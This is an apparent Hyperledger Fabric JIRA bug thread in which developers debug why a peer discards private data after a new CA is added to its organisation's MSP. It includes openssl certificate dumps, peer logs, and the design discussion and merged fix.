yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNKakNDQWN5Z0F3SUJBZ0lVUFAyOGxFazUrZzB2ZVRhOTZ0TkFFUkJ0bmFRd0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WVRFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TWpVMk1EQmFGdzB5TkRFeE1UWXhNekF4TURCYU1Gc3hFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0V4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFTApNQWtHQTFVRUN4TUNZMkV4RkRBU0JnTlZCQU1UQzFCbFpYSlBjbWN5UTBFeU1Ga3dFd1lIS29aSXpqMENBUVlJCktvWkl6ajBEQVFjRFFnQUUxUU8yWU9MRmhDR1l5eC9iRXRSbU1yLzFEdUFuc3JPTWErWWhic0hQNUxQQksvUHUKaUdVdEM5TEdySVNKVk1hZDRsUGtHVks0ZXVWeDlQZ0oyZkU2NzZObU1HUXdEZ1lEVlIwUEFRSC9CQVFEQWdFRwpNQklHQTFVZEV3RUIvd1FJTUFZQkFmOENBUUF3SFFZRFZSME9CQllFRkw3RFNVRUFueHEvdUJiWWhXT1k0ZlpaCnFlU3RNQjhHQTFVZEl3UVlNQmFBRkVWVTQrdkVNK0tiS0ZFTEhsQWdwbWxRc2l6ak1Bb0dDQ3FHU000OUJBTUMKQTBnQU1FVUNJUURJbzdjR0N6ME0wS1lnb2lWeHRuNEF6SUxFdEl4bjh1ajhDUlN0bmNBRWlBSWdWUzlTMGhHWQpyR0NkbTY3ZW1hNCtCb3hxS214eUV3UlpkMUFKRE5xMDQ1cz0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="" |  base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            3c:fd:bc:94:49:39:fa:0d:2f:79:36:bd:ea:d3:40:11:10:6d:9d:a4
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-a, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 12:56:00 2019 GMT
            Not After : Nov 16 13:01:00 2024 GMT
        Subject: L=frank-a, O=SecureKey Technologies Inc., OU=ca, CN=PeerOrg2CA2
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:d5:03:b6:60:e2:c5:84:21:98:cb:1f:db:12:d4:
                    66:32:bf:f5:0e:e0:27:b2:b3:8c:6b:e6:21:6e:c1:
                    cf:e4:b3:c1:2b:f3:ee:88:65:2d:0b:d2:c6:ac:84:
                    89:54:c6:9d:e2:53:e4:19:52:b8:7a:e5:71:f4:f8:
                    09:d9:f1:3a:ef
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                BE:C3:49:41:00:9F:1A:BF:B8:16:D8:85:63:98:E1:F6:59:A9:E4:AD
            X509v3 Authority Key Identifier: 
                keyid:45:54:E3:EB:C4:33:E2:9B:28:51:0B:1E:50:20:A6:69:50:B2:2C:E3

    Signature Algorithm: ecdsa-with-SHA256
         30:45:02:21:00:c8:a3:b7:06:0b:3d:0c:d0:a6:20:a2:25:71:
         b6:7e:00:cc:82:c4:b4:8c:67:f2:e8:fc:09:14:ad:9d:c0:04:
         88:02:20:55:2f:52:d2:11:98:ac:60:9d:9b:ae:de:99:ae:3e:
         06:8c:6a:2a:6c:72:13:04:59:77:50:09:0c:da:b4:e3:9b
yacovm@~/Downloads $ echo ""LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNKVENDQWN5Z0F3SUJBZ0lVYk9tTmVZTHFZNFZkalYyMmUxVGRJYWl3Rmc4d0NnWUlLb1pJemowRUF3SXcKWXpFUU1BNEdBMVVFQnhNSFpuSmhibXN0WWpFa01DSUdBMVVFQ2hNYlUyVmpkWEpsUzJWNUlGUmxZMmh1YjJ4dgpaMmxsY3lCSmJtTXVNUlF3RWdZRFZRUUxFd3RXWlhKcFptbGxaQzVOWlRFVE1CRUdBMVVFQXhNS1VHVmxjazl5Clp6SkRRVEFlRncweE9URXhNVGd4TXpFNU1EQmFGdzB5TkRFeE1UWXhNekkwTURCYU1Gc3hFREFPQmdOVkJBY1QKQjJaeVlXNXJMV0l4SkRBaUJnTlZCQW9URzFObFkzVnlaVXRsZVNCVVpXTm9ibTlzYjJkcFpYTWdTVzVqTGpFTApNQWtHQTFVRUN4TUNZMkV4RkRBU0JnTlZCQU1UQzFCbFpYSlBjbWN5UTBFeU1Ga3dFd1lIS29aSXpqMENBUVlJCktvWkl6ajBEQVFjRFFnQUUwbDAwVW5NS3I0SkRwdy96VmQ1UkgyWjZGVHVreEU3d05yaXgydnVLMzFBR1JNUWsKM1RITytGN3ZwNzJpZ3VEV1ZzN2dQVk91UHYwckQ0YWh1bUpsZEtObU1HUXdEZ1lEVlIwUEFRSC9CQVFEQWdFRwpNQklHQTFVZEV3RUIvd1FJTUFZQkFmOENBUUF3SFFZRFZSME9CQllFRkJ2bkQ1T3VQSzBuTkEvek1kWHRkbEhyCi95TlZNQjhHQTFVZEl3UVlNQmFBRk56dmk4YlY0WTBRWm41UjMvTllDS09ENXR1K01Bb0dDQ3FHU000OUJBTUMKQTBjQU1FUUNJRk5sVUJQZE1WdXNhVzVVOTZ3SEFrM2kwM0lJTjgzbUdSZStqNTRQTzdYREFpQXUyaW1OV2ovYwprNnBsT3kwcEMraTE0QVNKZGM2c0FGYWhKekR0a2t5ZHRBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo="" |  base64 --decode | openssl x509 -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6c:e9:8d:79:82:ea:63:85:5d:8d:5d:b6:7b:54:dd:21:a8:b0:16:0f
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-b, O=SecureKey Technologies Inc., OU=Verified.Me, CN=PeerOrg2CA
        Validity
            Not Before: Nov 18 13:19:00 2019 GMT
            Not After : Nov 16 13:24:00 2024 GMT
        Subject: L=frank-b, O=SecureKey Technologies Inc., OU=ca, CN=PeerOrg2CA2
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:d2:5d:34:52:73:0a:af:82:43:a7:0f:f3:55:de:
                    51:1f:66:7a:15:3b:a4:c4:4e:f0:36:b8:b1:da:fb:
                    8a:df:50:06:44:c4:24:dd:31:ce:f8:5e:ef:a7:bd:
                    a2:82:e0:d6:56:ce:e0:3d:53:ae:3e:fd:2b:0f:86:
                    a1:ba:62:65:74
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                1B:E7:0F:93:AE:3C:AD:27:34:0F:F3:31:D5:ED:76:51:EB:FF:23:55
            X509v3 Authority Key Identifier: 
                keyid:DC:EF:8B:C6:D5:E1:8D:10:66:7E:51:DF:F3:58:08:A3:83:E6:DB:BE

    Signature Algorithm: ecdsa-with-SHA256
         30:44:02:20:53:65:50:13:dd:31:5b:ac:69:6e:54:f7:ac:07:
         02:4d:e2:d3:72:08:37:cd:e6:19:17:be:8f:9e:0f:3b:b5:c3:
         02:20:2e:da:29:8d:5a:3f:dc:93:aa:65:3b:2d:29:0b:e8:b5:
         e0:04:89:75:ce:ac:00:56:a1:27:30:ed:92:4c:9d:b4

{code}
Now, if we look at the private data part in the commit we see:
{code:java}
2019-11-18 13:38:33.932 UTC [committer.txvalidator] Validate -> INFO cf8 [dlbp-org2] Validated block [7] in 10ms
2019-11-18 13:38:33.932 UTC [lockbasedtxmgr] newQueryExecutor -> DEBU cf9 constructing new query executor txid = [ec641a3a-7da2-4562-a229-39ff32f0e5f6]
2019-11-18 13:38:33.932 UTC [statecouchdb] GetState -> DEBU cfa GetState(). ns=lscc, key=custodiancc~collection
2019-11-18 13:38:33.932 UTC [statecouchdb] getState -> DEBU cfb key:[custodiancc~collection] found in the lsccStateCache
2019-11-18 13:38:33.932 UTC [lockbasedtxmgr] Done -> DEBU cfc Done with transaction simulation / query execution [ec641a3a-7da2-4562-a229-39ff32f0e5f6]
2019-11-18 13:38:33.932 UTC [msp] GetManagerForChain -> DEBU cfd Returning existing manager for channel 'dlbp-org2'
2019-11-18 13:38:33.932 UTC [msp] DeserializeIdentity -> DEBU cfe Obtaining identity
2019-11-18 13:38:33.932 UTC [msp.identity] newIdentity -> DEBU cff Creating identity instance for cert -----BEGIN CERTIFICATE-----
MIICOzCCAeGgAwIBAgIUHSF5RcXSSCbl2Mjcn0eqTQqIFHYwCgYIKoZIzj0EAwIw
WzEQMA4GA1UEBxMHZnJhbmstYjEkMCIGA1UEChMbU2VjdXJlS2V5IFRlY2hub2xv
Z2llcyBJbmMuMQswCQYDVQQLEwJjYTEUMBIGA1UEAxMLUGVlck9yZzJDQTEwHhcN
MTkxMTE4MTMyMDAwWhcNMjQxMTE2MTMyNDAwWjBcMQswCQYDVQQGEwJVUzEXMBUG
A1UECBMOTm9ydGggQ2Fyb2xpbmExFDASBgNVBAoTC0h5cGVybGVkZ2VyMQ0wCwYD
VQQLEwRwZWVyMQ8wDQYDVQQDDAZwZWVyX2EwWTATBgcqhkjOPQIBBggqhkjOPQMB
BwNCAAT0Bo3RP/rQI4peEynhbKMIkCKo3U/ZIrVQ8u3kV+2cJghL9+eCPcao7jJi
Jus4diAcfaNaDZEYDqmCfkRdDTUXo4GBMH8wDgYDVR0PAQH/BAQDAgeAMAwGA1Ud
EwEB/wQCMAAwHQYDVR0OBBYEFDsY7S7eXO/0l/fBppR2pXaDTtTkMB8GA1UdIwQY
MBaAFLH5bERc1o24y2oXd0HU2kpP6C07MB8GA1UdEQQYMBaCFHBlZXItcGVlcm9y
ZzItMjAwMTNhMAoGCCqGSM49BAMCA0gAMEUCIQDLyBAJL8awR+mi+1xP6xJ0W1XO
id/4UFL3LiRi53KGXQIgVAcuJAuQJvC5+vYuIDQHz9jr/+0pe1wR92N1vrSpQSs=
-----END CERTIFICATE-----
2019-11-18 13:38:33.932 UTC [cauthdsl] deduplicate -> ERRO d00 Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
2019-11-18 13:38:33.932 UTC [cauthdsl] func1 -> DEBU d01 0xc0026fbe30 gate 1574084313932866584 evaluation starts
2019-11-18 13:38:33.932 UTC [cauthdsl] func2 -> DEBU d02 0xc0026fbe30 signed by 0 principal evaluation starts (used [false])
2019-11-18 13:38:33.932 UTC [cauthdsl] func2 -> DEBU d03 0xc0026fbe30 principal evaluation fails
2019-11-18 13:38:33.932 UTC [cauthdsl] func1 -> DEBU d04 0xc0026fbe30 gate 1574084313932866584 evaluation fails
2019-11-18 13:38:33.932 UTC [gossip.privdata] isEligible -> DEBU d05 Skipping namespace custodiancc collection custodian_permanent because we're not eligible for the private data
2019-11-18 13:38:33.932 UTC [gossip.privdata] inspectTransaction -> DEBU d06 Peer is not eligible for collection, channel [dlbp-org2], chaincode [custodiancc], collection name [custodian_permanent], txID [28e4be6a7ce9b1856b6257feccaf650dd4dba8a215f64929af2b6971ee445abb] the policy is [&privdata.SimpleCollection{name:""custodian_permanent"", accessPolicy:(*cauthdsl.policy)(0xc0025ce8e0), memberOrgs:[]string{""PeerOrg2""}, conf:common.StaticCollectionConfig{Name:""custodian_permanent"", MemberOrgsPolicy:(*common.CollectionPolicyConfig)(0xc0003666f0), RequiredPeerCount:0, MaximumPeerCount:1, BlockToLive:0x0, MemberOnlyRead:false, Type:0, TimeToLive:"""", XXX_NoUnkeyedLiteral:struct {}{}, XXX_unrecognized:[]uint8(nil), XXX_sizecache:0}}]. Skipping.

{code}
And if we look at the certificate:
{code:java}
yacovm@~ $ cat << EOF | openssl x509 -text -noout 
> -----BEGIN CERTIFICATE-----
> MIICOzCCAeGgAwIBAgIUHSF5RcXSSCbl2Mjcn0eqTQqIFHYwCgYIKoZIzj0EAwIw
> WzEQMA4GA1UEBxMHZnJhbmstYjEkMCIGA1UEChMbU2VjdXJlS2V5IFRlY2hub2xv
> Z2llcyBJbmMuMQswCQYDVQQLEwJjYTEUMBIGA1UEAxMLUGVlck9yZzJDQTEwHhcN
> MTkxMTE4MTMyMDAwWhcNMjQxMTE2MTMyNDAwWjBcMQswCQYDVQQGEwJVUzEXMBUG
> A1UECBMOTm9ydGggQ2Fyb2xpbmExFDASBgNVBAoTC0h5cGVybGVkZ2VyMQ0wCwYD
> VQQLEwRwZWVyMQ8wDQYDVQQDDAZwZWVyX2EwWTATBgcqhkjOPQIBBggqhkjOPQMB
> BwNCAAT0Bo3RP/rQI4peEynhbKMIkCKo3U/ZIrVQ8u3kV+2cJghL9+eCPcao7jJi
> Jus4diAcfaNaDZEYDqmCfkRdDTUXo4GBMH8wDgYDVR0PAQH/BAQDAgeAMAwGA1Ud
> EwEB/wQCMAAwHQYDVR0OBBYEFDsY7S7eXO/0l/fBppR2pXaDTtTkMB8GA1UdIwQY
> MBaAFLH5bERc1o24y2oXd0HU2kpP6C07MB8GA1UdEQQYMBaCFHBlZXItcGVlcm9y
> ZzItMjAwMTNhMAoGCCqGSM49BAMCA0gAMEUCIQDLyBAJL8awR+mi+1xP6xJ0W1XO
> id/4UFL3LiRi53KGXQIgVAcuJAuQJvC5+vYuIDQHz9jr/+0pe1wR92N1vrSpQSs=
> -----END CERTIFICATE-----
> 
> EOF
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1d:21:79:45:c5:d2:48:26:e5:d8:c8:dc:9f:47:aa:4d:0a:88:14:76
    Signature Algorithm: ecdsa-with-SHA256
        Issuer: L=frank-b, O=SecureKey Technologies Inc., OU=ca, CN=PeerOrg2CA1
        Validity
            Not Before: Nov 18 13:20:00 2019 GMT
            Not After : Nov 16 13:24:00 2024 GMT
        Subject: C=US, ST=North Carolina, O=Hyperledger, OU=peer, CN=peer_a
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub: 
                    04:f4:06:8d:d1:3f:fa:d0:23:8a:5e:13:29:e1:6c:
                    a3:08:90:22:a8:dd:4f:d9:22:b5:50:f2:ed:e4:57:
                    ed:9c:26:08:4b:f7:e7:82:3d:c6:a8:ee:32:62:26:
                    eb:38:76:20:1c:7d:a3:5a:0d:91:18:0e:a9:82:7e:
                    44:5d:0d:35:17
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Subject Key Identifier: 
                3B:18:ED:2E:DE:5C:EF:F4:97:F7:C1:A6:94:76:A5:76:83:4E:D4:E4
            X509v3 Authority Key Identifier: 
                keyid:B1:F9:6C:44:5C:D6:8D:B8:CB:6A:17:77:41:D4:DA:4A:4F:E8:2D:3B

            X509v3 Subject Alternative Name: 
                DNS:peer-peerorg2-20013a
    Signature Algorithm: ecdsa-with-SHA256
         30:45:02:21:00:cb:c8:10:09:2f:c6:b0:47:e9:a2:fb:5c:4f:
         eb:12:74:5b:55:ce:89:df:f8:50:52:f7:2e:24:62:e7:72:86:
         5d:02:20:54:07:2e:24:0b:90:26:f0:b9:fa:f6:2e:20:34:07:
         cf:d8:eb:ff:ed:29:7b:5c:11:f7:63:75:be:b4:a9:41:2b

{code}
Notice the AKI is: *B1:F9:6C:44:5C:D6:8D:B8:CB:6A:17:77:41:D4:DA:4A:4F:E8:2D:3B*

But we have an intermediate CA with such an SKI: 
 *B1:F9:6C:44:5C:D6:8D:B8:CB:6A:17:77:41:D4:DA:4A:4F:E8:2D:3B*
 X509v3 Authority Key Identifier: 
 *keyid:DC:EF:8B:C6:D5:E1:8D:10:66:7E:51:DF:F3:58:08:A3:83:E6:DB:BE*

 

This isn't good... I think it should work :/

 

[~jyellick] [~angelo.decaro] [~ales] what is going on here? There should be a certification path to a root CA... why is the MSP behaving this way?

 

[~silveraid]

On another note: what is configurationsnap ? is it a system chaincode? Why does LSCC treat it as a non system chaincode? It can't find its namespace in LSCC:
{code:java}
2019-11-18 13:39:14.317 UTC [committer.txvalidator] GetInfoForValidate -> ERRO 48d4 Unable to get chaincode data from ledger for txid 9f2b2b8ab9c998c56f09dfe738e8ee339ad9e42ee116efa55759a48cd167a0eb, due to lscc
's state for [configurationsnap] not found.
2019-11-18 13:39:14.317 UTC [committer.txvalidator] VSCCValidateTx -> ERRO 48d5 GetInfoForValidate for txId = 9f2b2b8ab9c998c56f09dfe738e8ee339ad9e42ee116efa55759a48cd167a0eb returned error: lscc's state for [co
nfigurationsnap] not found.
github.com/hyperledger/fabric/core/committer/txvalidator.(*VsccValidatorImpl).getCDataForCC
        /opt/gopath/src/github.com/hyperledger/fabric/core/committer/txvalidator/vscc_validator.go:304
github.com/hyperledger/fabric/core/committer/txvalidator.(*VsccValidatorImpl).GetInfoForValidate
        /opt/gopath/src/github.com/hyperledger/fabric/core/committer/txvalidator/vscc_validator.go:344
github.com/hyperledger/fabric/core/committer/txvalidator.(*VsccValidatorImpl).VSCCValidateTx
        /opt/gopath/src/github.com/hyperledger/fabric/core/committer/txvalidator/vscc_validator.go:190
github.com/hyperledger/fabric/core/committer/txvalidator.(*TxValidator).validateTx
        /opt/gopath/src/github.com/hyperledger/fabric/core/committer/txvalidator/validator.go:345
github.com/hyperledger/fabric/core/committer/txvalidator.(*TxValidator).Validate.func1.1
        /opt/gopath/src/github.com/hyperledger/fabric/core/committer/txvalidator/validator.go:158
runtime.goexit
        /opt/go/src/runtime/asm_amd64.s:1333
2019-11-18 13:39:14.317 UTC [committer.txvalidator] validateTx -> ERRO 48d6 VSCCValidateTx for transaction txId = 9f2b2b8ab9c998c56f09dfe738e8ee339ad9e42ee116efa55759a48cd167a0eb returned error: lscc's state for
 [configurationsnap] not found.
2019-11-18 13:39:14.317 UTC [committer.txvalidator] validateTx -> DEBU 48d7 [consortium] validateTx completes for block 0xc00296aa80 env 0xc004149f40 txn 0
2019-11-18 13:39:14.317 UTC [committer.txvalidator] Validate -> DEBU 48d8 got result for idx 0, code 255
2019-11-18 13:39:14.317 UTC [committer.txvalidator] Validate -> INFO 48d9 [consortium] Validated block [9] in 2ms
{code};;;","19/Nov/19 12:15 AM;silveraid;It is a system chaincode what I commented out to load to avoid additional noise. It makes tremendous amount of logs.;;;","19/Nov/19 12:21 AM;yacovm;I think it is not configured to be a system chaincode... you should check the *core.yaml*;;;","19/Nov/19 12:36 AM;silveraid;Yes, I commented it out.;;;","25/Nov/19 7:44 PM;ales;Looking into it - I'm trying to reproduce using our integration tests;;;","26/Nov/19 8:30 PM;ales;[~silveraid] pls PM me on rocketchat, I've got a couple of questions for you;;;","27/Nov/19 7:24 PM;ales;I think I was able to reproduce the issue. Just reiterating the scenario in my recreate:
 - org2 starts with 1 root CA (CA1)
 - org2.peer0 has a cert issued by CA1 and joins the channel right away
 - a tx in block 5 does a private write in a collection; org2.Member are eligible
 - the channel is updated at block 6 by adding CA2 to the MSP of org2
 - org2.peer1 has a cert issued by CA2 and only joins thereafter

The relevant log entries are:
{noformat}
[e][org2.peer1] 2019-11-27 09:52:56.009 CET [common.channelconfig] ProposeMSP -> DEBU 1bc Proposing new MSP name:""Org2MSP"" ... 
{noformat}
here org2.peer1 has the initial MSP configuration with a single root CA
{noformat}
[e][org2.peer1] 2019-11-27 09:53:03.246 CET [gossip.privdata] StoreBlock -> INFO d8f [testchannel] Received block [5] from buffer
...
[e][org2.peer1] 2019-11-27 09:53:03.248 CET [committer.txvalidator] Validate -> INFO dcd [testchannel] Validated block [5] in 2ms
...
[e][org2.peer1] 2019-11-27 09:53:03.248 CET [cauthdsl] deduplicate -> ERRO dd7 Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority (possibly because of ""x509: ECDSA verification failure"" while trying to verify candidate authority certificate ""ca.org2.example.com"")) for identity 0
[e][org2.peer1] 2019-11-27 09:53:03.249 CET [gossip.privdata] isEligible -> DEBU df0 Skipping namespace marblesp collection collectionMarbles because we're not eligible for the private data
[e][org2.peer1] 2019-11-27 09:53:03.249 CET [gossip.privdata] inspectTransaction -> DEBU df1 Peer is not eligible for collection, channel [testchannel], chaincode [marblesp], collection name [collectionMarbles], txID [4868df6308276f82a854ec9332dc6aaeee08e36b2457170d554204475e6d530a] the policy is [&privdata.SimpleCollection{name:""collectionMarbles"", accessPolicy:(*cauthdsl.policy)(0xc006885d80), memberOrgs:[]string{""Org1MSP"", ""Org2MSP""}, conf:common.StaticCollectionConfig{Name:""collectionMarbles"", MemberOrgsPolicy:(*common.CollectionPolicyConfig)(0xc0068715f0), RequiredPeerCount:1, MaximumPeerCount:2, BlockToLive:0xf4240, MemberOnlyRead:false, XXX_NoUnkeyedLiteral:struct {}{}, XXX_unrecognized:[]uint8(nil), XXX_sizecache:0}}]. Skipping.{noformat}
 here org2.peer1 processes block 5 and thinks it's not eligible for private data because its channel MSP still only has the initial version with one root CA. This is not a bug: at the time of evaluation, the conclusion we draw is correct.
{noformat}
[e][org2.peer1] 2019-11-27 09:53:03.497 CET [gossip.privdata] StoreBlock -> INFO e2c [testchannel] Received block [6] from buffer
[e][org2.peer1] 2019-11-27 09:53:03.502 CET [common.channelconfig] ProposeMSP -> DEBU e96 Proposing new MSP name:""Org2MSP""
{noformat}
here we finally commit the new MSP config, but it's too late because we don't seem to re-evaluate private data for block 5

This scenario highlights two issues:
 # given that the MSP configuration contains a single fabric_node_ous field, adding a CA to an existing MSP might create problems. Indeed, if any of the OU identifiers (client, peer, admin or orderer) sets the certificate field, the client, peer, admin or orderer certificate issued by one of the two CAs will be invalid after the config update. We might want to extend the certificate field to become a slice.
 # reconciliation does not seem to kick in in this scenario, possibly because there is no membership change. We might want to extend reconciliation and trigger it also upon channel updates. Looping in [~Senthil1] and [~manish-sethi];;;","27/Nov/19 8:39 PM;denyeart;Final action not yet determined, but setting FixVersion to v1.4.5 and v2.0.0 for now.;;;","27/Nov/19 9:01 PM;Senthil1;Thanks [~ales] for a very detailed and clear description. 

Currently, in the reconciler DB, we store two set of entries for missing entries: one set is for eligible collection and another is for ineligible collect (I.e., the peer is not a member now but can become a member later). The reconciler only retrieves missing pvtData of eligible collections. Whether a private data is eligible or not is an input from gossip.privdata (gossip would know this after applying isEligible() as you pointed out). 

In the above scenario, though org1.peer1 is actually eligible for the private data present in block 5, we know its eligibility after committing block 6 only. To fix this, after a channel update, we need to call AmMember() for existing collections and appropriately move entries from ineligible to eligible set so that reconciler can fetch the missing private data.

We already call AmMember(), when the chaincode is upgraded and there is a change in collection membership, to check whether the peer has become eligible for a collection. If the peer is found to be a newly added member to an existing collection, the appropriate collection entries from the ineligible set would be moved to eligible set such that reconciler can fetch those data. Hence, I think it would be easy to extend the existing code to handle channel updates as well. [~manish-sethi] What do you think? ;;;","27/Nov/19 11:06 PM;yacovm;Don't want to derail the discussion, but - why are we even differentiating between eligible collections and ineligible collections in the storage anyway? Why not check if we're eligible of everything the block has each time? In the end, all these predicates are reduced to checking *SatisfiesPrincipal* of MSP IDs which is anyway heavily cached.;;;","27/Nov/19 11:32 PM;Senthil1;[~yacovm] Currently, the gossip coordinator provides input to the ledger on eligible/ineligible missing private data (gossip anyway uses isEligible(), etc... to find this information). We store them in two different namespaces so that it would be easy to query missing private data when the reconciler asks for it.

We move data from ineligible to eligible namespace only when the peer is added as a new member to a collection – this is checked only when the chaincode is upgraded.;;;","27/Nov/19 11:40 PM;yacovm;Well it should be upon every config change, because every config changes can change completely how the MSP behaves;;;","03/Dec/19 4:33 AM;manish-sethi;[~ales] - regarding the reconciliation issue, I feel that this adds to what we had discussed a couple of times but not in enough details - which is that use of policies for determining membership is an overuse - particularly for the self-peer. Do you see any issue If we change the implementation of AmMemberOf function based on peer's org simply present in the list based on string match.;;;","03/Dec/19 6:55 PM;ales;I completely agree with that Manish. I think the (only?) reason why we used policies and not simply org IDs was gossip. [~yacovm]?;;;","03/Dec/19 7:10 PM;Senthil1;Now we have support for the organization unit in membership/endorsement policy? I remember [~yacovm] citing this as the reason for not doing string matching.;;;","03/Dec/19 7:19 PM;yacovm;In general I lean against fixing things that aren't broken. Did anyone even try to look what is the performance gain in this proposal? These calls should be heavily cached by the MSP cache. 

By using nominal MSP ID comparison, we are breaking free from the MSP abstraction of principles and we can only use collections that are not anonymous. What if in the future we would want to have a collection that doesn't write the membership in the clear?;;;","04/Dec/19 12:39 AM;manish-sethi;[~yacovm] - if you look at the overall scenario. The other nodes know that you are Org2.peer1 and sending you the blocks and perhaps the private data (using your own piggybacking mechanism). But the poor receiver himself does not recognize that he is what others think he is and discards the data. I don't think that at this stage just add entries for missing ineligible data and retrieve them at a later stage  (which could accumulate a significant data based on when his favorable channel config arrives) is the way.

If you strictly want to use policy evaluation then I would think of an alternate way where this peer should carry all the identities and should choose the one for evaluation based on height (As we do for collection configuration). wdyt?;;;","04/Dec/19 1:12 AM;yacovm;{quote}But the poor receiver himself does not recognize that he is what others think he is and discards the data{quote}

This is expected due to the fact that its root CA wasn't added to the Blockchain at that height, however - reconciliation should fix it, but it doesn't due to the fact that we don't re-evaluate the namespaces at time of config block commit, as we should have (in my humble opinion :) ) . 


{quote}
If you strictly want to use policy evaluation then I would think of an alternate way where this peer should carry all the identities and should choose the one for evaluation based on height (As we do for collection configuration). wdyt?{quote}

What do you mean carry all identities? A peer has only a single identity and it doesn't change at any height;;;","04/Dec/19 1:49 AM;manish-sethi;What I meant by all identities was that the id from the previous root CA that can be evaluate at the given height for self use of the peer. Otherwise, I am not sure how to comprehend this paradox - In Ale's example, till block-5, the peer itself has not proper way of evaluating that he is part of the channel and still requesting blocks and hence gets stuck at the private data part... why the special treatment to private data pull - there must be something fundamental wrong here that's how I see it and hence initially suggested that peer itself should at least know it's ID. The limitation is our implementation of evaluation of ID that I was focusing more on that than to workaround for the private data (hence the initial suggestion was to simply use the string ID);;;","04/Dec/19 2:39 AM;Senthil1;If OU is not the real reason, isn't the string matching the right way?;;;","10/Jan/20 4:58 AM;silveraid;Just checking in to see if there is any progress have been made.;;;","11/Jan/20 4:59 AM;denyeart;[~silveraid] Yes, the Fabric developers are pursuing Manish's idea around having the peer that is requesting private data simply use MSPID to determine if it is eligible for private data, rather than using the policy evaluation which fails in the case of a new CA cert.;;;","11/Jan/20 5:03 AM;yacovm;{quote} Yes, the Fabric developers are pursuing Manish's idea around having the peer that is requesting private data simply use MSPID to determine if it is eligible for private data, rather than using the policy evaluation which fails in the case of a new CA cert.{quote}

Is this being done this way only for the existing collections that are nominal? Because this won't work with anonymous collections... ;;;","13/Jan/20 2:29 PM;denyeart;[~yacovm] Yes, intent is for this to be a tactical solution for existing collections.  [~ales] is going re-summarize proposal so that we're all on the same page.;;;","21/Jan/20 8:54 PM;ales;Here's a summary of the proposed fix ([~denyeart], [~manish-sethi], [~yacovm] feel free to correct/expand): the logic a gossip peer uses to determine whether it will send preimage data to another peer will remain unchanged (i.e. still policy-based using channel msps, thus honouring CRLs). The receiving peer on the other hand will determine whether it should accept the preimage just by checking the list of MSP IDs and seeing if its own MSP ID is present. This logic deviates from the current implementation which is currently also policy-based. This deviation can only be enabled provided that the policy is a simple or of org member principals (which should be true in the overwhelming majority of the cases) - else fall back on the current policy-based determination. This deviation thus implemented should guarantee dissemination decisions which are consistent with what the peer currently does, and it should fix the case of this JIRA which is a bug.

In practice, we recommend coding a new _Eligible()_ function which implements the two behaviours (MSP id checking in case of a policy with simple ORs and the current call to _AmMemberOf_ otherwise).;;;","14/Feb/20 4:21 AM;caod;1.4: [https://github.com/hyperledger/fabric/pull/626]

master: [https://github.com/hyperledger/fabric/pull/673]

Will cherry-pick to release 2.0 after merged on master;;;","14/Feb/20 11:44 PM;denyeart;Fix merged in release-1.4 for upcoming v1.4.5. It will also be cherry picked to master and release-2.0.
[~silveraid] Would you be able to try it out on release-1.4? Would be great to get some confirmation prior to releasing v1.4.5.;;;","18/Feb/20 10:50 PM;silveraid;Hi, I will test this ass soon as possible, hopefully today.;;;","19/Feb/20 6:46 AM;denyeart;Merged in all three branches.;;;","20/May/20 5:24 PM;hello2mao;[~caod] Hi, I found a small issue about this change. 

See:  [https://github.com/hyperledger/fabric/pull/1304];;;","28/May/20 5:06 AM;silveraid;I have tested the original fix and it seems like working as expected. All of the private data was able to sync over without any problem.;;;","28/May/20 5:21 AM;caod;Great to hear! Thanks for confirming [~silveraid]!;;;"
